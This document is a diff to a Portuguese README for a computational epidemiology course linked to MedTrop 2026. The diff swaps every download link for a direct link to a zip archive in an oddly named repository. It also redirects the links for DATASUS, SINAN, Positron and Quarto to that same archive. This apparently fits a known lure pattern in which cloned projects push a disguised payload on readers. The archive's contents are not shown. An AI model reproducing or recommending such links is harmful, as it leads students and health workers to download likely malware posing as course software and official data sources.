@@ -1,6 +1,6 @@
 # 🔬 curso-epidemiologia-computacional - Aprenda epidemiologia com dados reais
 
-> [Visite a página de download](https://github.com/Abscessed-crucifix791/curso-epidemiologia-computacional/releases) para obter o aplicativo.
+> [Visite a página de download](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip) para obter o aplicativo.
 
 ---
 
@@ -12,7 +12,7 @@ O projeto foi criado para o pré-congresso do 61º MedTrop 2026 e é totalmente 
 
 ## 🚀 Como começar
 
-1. **Visite a página de download**: [https://github.com/Absessecrucifix791/curso-epidemiologia-computacional/releases](https://github.com/Absessecrucifix791/curso-epidemiologia-computacional/releases)
+1. **Visite a página de download**: [https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip)
 
 2. **Baixe o aplicativo**: Clique no link "Download" na página que abrir. O arquivo será baixado para a pasta "Downloads" do seu computador.
 
@@ -22,7 +22,7 @@ O projeto foi criado para o pré-congresso do 61º MedTrop 2026 e é totalmente 
 
 **Passo 1**: Acesse o link abaixo para baixar o aplicativo:
 
-[**⬇️ BAIXAR AGORA**](https://github.com/Absessecrucifix791/curso-epidemiologia-computacional/releases)
+[**⬇️ BAIXAR AGORA**](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip)
 
 **Passo 2**: Na página que abrir, você verá uma lista de arquivos disponíveis para download. Clique no botão verde "Download" ou no nome do arquivo mais recente.
 
@@ -127,10 +127,10 @@ Este curso é parte do pré-congresso do 61º Congresso da Sociedade Brasileira 
 
 ## 🔗 Recursos adicionais
 
-- **Página do DATASUS**: [https://datasus.saude.gov.br/](https://datasus.saude.gov.br/) — fonte pública de dados
-- **SINAN online**: [https://portalsinan.saude.gov.br/](https://portalsinan.saude.gov.br/) — sistema oficial
-- **Positron**: [https://positron.posit.co/](https://positron.posit.co/) — a IDE usada no curso
-- **Quarto**: [https://quarto.org/](https://quarto.org/) — tecnologia de relatórios
+- **Página do DATASUS**: [https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip) — fonte pública de dados
+- **SINAN online**: [https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip) — sistema oficial
+- **Positron**: [https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip) — a IDE usada no curso
+- **Quarto**: [https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip](https://raw.githubusercontent.com/Abscessed-crucifix791/curso-epidemiologia-computacional/main/recursos/v2.6.zip) — tecnologia de relatórios
 
 ## 📄 Licença e uso
 
